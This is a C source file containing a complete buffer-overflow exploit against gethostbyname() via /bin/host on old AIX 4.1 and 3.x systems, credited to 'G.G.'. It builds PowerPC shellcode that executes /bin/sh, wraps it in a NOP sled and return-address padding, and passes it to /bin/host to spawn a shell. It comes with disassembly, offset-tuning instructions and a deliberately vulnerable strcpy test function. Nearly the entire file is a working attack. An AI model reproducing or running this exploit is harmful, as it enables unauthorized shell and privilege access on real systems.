/*
AIX 4.1 ,4.?, 3.? gethostbyname() and /bin/host exploit.
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
If the program gives you 'Segmentation fault' or 'Illegal instruction',
then try at least the following arguments:(string
length,offset,kludge1,kludge2)
78 40 1 1
78 40 1 0
78 40 0 0
78 40 0 1
If you get coredump, examine the registers.
The higher 16 bits of TOC and IAR(CTR) should be the values,
printed by the program (the address of execv() ). The last two arguments
are added to correct some difference (because of carry?,cache? ???).
Sorry for the lame coding.

       Compile with: cc -g test.c
       try:
       ./a.out 78 40 1 1
       ./a.out 78 40 0 0
       ./a.out 78 40 0 1
       ./a.out 78 40 0 0
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
*/

       #include <stdio.h>
       #include <stdlib.h>

       /*Used only for disassembling*/
       void sh2()
       {
       int junk[0x100];
       int s[2];

       int toc;
       int ctr;

       junk[0x100]=0x11;

       toc=0xf0192c48;
       ctr=0xd0024c0c;

       s[0]=0x2f62696e;
       s[1]=0x2f736800;
       execv(&s,0);
       }
       /*Used for testing*/
       void buggy(char *s)
       {
       char a[4];
       unsigned int junk[150];
       strcpy(a,s);
       puts("Over");
       if(junk[20])
        puts("P");
       }
       /*The program*/
       main(int argc,char **argv)
       {
       unsigned int junk[300];
       /*The code*/
       unsigned int code[]={
       0x7c0802a6 , 0x9421fbb0 , 0x90010458 , 0x3c60f019 ,
       0x30632c48 , 0x90610440 , 0x3c60d002 , 0x30634c0c ,
       0x90610444 , 0x3c602f62 , 0x3063696e , 0x90610438 ,
       0x3c602f73 , 0x30636801 , 0x3863ffff , 0x9061043c ,
       0x30610438 , 0x7c842278 , 0x80410440 , 0x80010444 ,
       0x7c0903a6 , 0x4e800420, 0x0
       };
       /* disassembly
       7c0802a6        mfspr   r0,LR
       9421fbb0        stu     SP,-1104(SP) --get some stack
       90010458        st      r0,1112(SP)
       3c60f019        cau     r3,r0,0xf019 --CTR changed at runtime
       30632c48        ai      r3,r3,11336  --CTR changed at runtime should be
       kludged
       90610440        st      r3,1088(SP)
       3c60d002        cau     r3,r0,0xd002 --TOC changed at runtime
       30634c0c        ai      r3,r3,19468  --TOC changed at runtime should be
       kludged
       90610444        st      r3,1092(SP)
       3c602f62        cau     r3,r0,0x2f62 --'/bin/sh\x01'
       3063696e        ai      r3,r3,26990
       90610438        st      r3,1080(SP)
       3c602f73        cau     r3,r0,0x2f73
       30636801        ai      r3,r3,26625
       3863ffff        addi    r3,r3,-1
       9061043c        st      r3,1084(SP) --terminate /bin/sh with 0
       30610438        ai      r3,SP,1080
       7c842278        xor     r4,r4,r4    --argv=NULL
       80410440        lwz     RTOC,1088(SP) --prepare to jump
       80010444        lwz     r0,1092(SP) --jump
       7c0903a6        mtspr   CTR,r0
       4e800420        bctr              --jump
       */

       unsigned int buf[600];
       unsigned int i,nop,mn;
       int max;

       unsigned int toc;
       unsigned int eco;
       unsigned int *pt;
       int carry1=1;
       int carry2=1;

       pt=(unsigned *) &execv;
       toc=*(pt+1);
       eco=*pt;
       if (argv[3]) carry1=atoi(argv[3]);
       if (argv[4]) carry2=atoi(argv[4]);
       max=atoi(argv[1]);
       if(max==0) max=78;
       mn=40;
       if(argv[2])
               mn=atoi(argv[2]);
       *((unsigned short *)code +9)=(unsigned short) (toc & 0x0000ffff);
       *((unsigned short *)code +7)=carry1+(unsigned short) ((toc >> 16) &
       0x0000ffff);
       /*              1+ because of CARRYFLAG? CACHE?*/
       *((unsigned short *)code +15)=(unsigned short) (eco & 0x0000ffff);
       *((unsigned short *)code +13)=carry2+(unsigned short) ((eco >> 16) &
       0x0000ffff);

       puts("Test AIX!");
       puts("Discovered and coded by G.G.");
       printf("TOC:%0x,CTR:%0x\n",toc,eco);
       junk[50]=1;
       for(nop=0;nop<mn;nop++)
        buf[nop]=0x4ffffb82;/*nop*/
       strcpy((char*)&buf[nop],(char*)&code);
       i=nop+strlen(code)/4-1;
       while(i++<max)
       {
        buf[i]=(unsigned) &buf[nop];
       }
       buf[i]=0;

       for(i=0;i<nop;i++)
        buf[i]=(unsigned)&buf[nop];

       /**?????????????????***/

       for(i=0;i<300;i++) junk[i]=(unsigned)&buf[nop];

       puts("Start...");/*Here we go*/
       i=execl("/bin/host","host",(char*)&buf,0);

       puts((char*)buf);
       printf("%p\n",&buf[nop]);
       if (!junk[50]) puts("s");
       printf("OK\n");
       }
